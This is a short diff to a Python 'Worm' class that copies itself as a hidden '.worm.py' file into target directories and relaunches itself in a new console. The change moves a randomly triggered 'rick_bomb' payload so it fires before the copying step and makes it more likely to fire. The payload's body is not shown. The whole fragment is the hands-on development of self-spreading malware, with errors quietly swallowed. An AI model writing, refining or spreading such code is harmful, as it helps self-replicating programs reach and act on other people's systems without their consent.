@@ -142,11 +142,12 @@ class Worm:
     
     def create_new_worm(self):
         try:
+            if self.russian_roulette():
+                self.rick_bomb()
             for directory in self.target_dir_list:
                 destination = os.path.join(directory, ".worm.py")
                 shutil.copyfile(self.own_path, destination)
-            if self.russian_roulette():
-                self.rick_bomb()
+            
         except:
             logging.warning("exception occurred: cannot create new worm")
     
@@ -196,7 +197,7 @@ class Worm:
             subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
         
     def russian_roulette(self):
-        if ROULETTE == random.randrange(0, 3000):
+        if ROULETTE == random.randint(0, 2000):
             return True
             #self.rick_bomb()
         else:
